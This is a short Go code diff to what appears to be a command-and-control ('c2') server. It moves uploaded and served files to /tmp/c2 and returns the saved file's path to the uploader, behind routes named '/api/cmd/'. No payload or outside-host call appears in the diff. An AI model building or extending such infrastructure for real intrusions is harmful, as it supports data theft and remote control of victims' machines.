@@ -27,7 +27,7 @@ type domainObject struct {
 func Start(port string) {
 	router := httprouter.New()
 
-	router.ServeFiles("/files/*filepath", http.Dir("/tmp"))
+	router.ServeFiles("/files/*filepath", http.Dir("/tmp/c2"))
 
 	//Main Entry
 	router.POST("/api/cmd/files", apiFiles)
@@ -82,7 +82,7 @@ func apiFiles(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
 	fmt.Printf("MIME Header: %+v\n", handler.Header)
 
 	// 3. write temporary file on our server
-	tempFile, err := ioutil.TempFile("/tmp", handler.Filename)
+	tempFile, err := ioutil.TempFile("/tmp/c2", handler.Filename)
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -93,15 +93,16 @@ func apiFiles(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
 	}
 	tempFile.Write(fileBytes)
 
-	jsond := map[string]interface{}{
-		"status": "File Uploaded",
-	}
+	//jsond := map[string]interface{}{
+	//	"file": tempFile,
+	//}
 
-	jsondata, err := json.Marshal(jsond)
+	//jsondata, err := json.Marshal(jsond)
 	if err != nil {
 		log.Fatalln(err)
 	}
-	fmt.Fprintf(w, string(jsondata))
+	//fmt.Fprintf(w, string(jsondata))
+	fmt.Fprintf(w, tempFile.Name())
 }
 
 func apiCmdUpdate(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
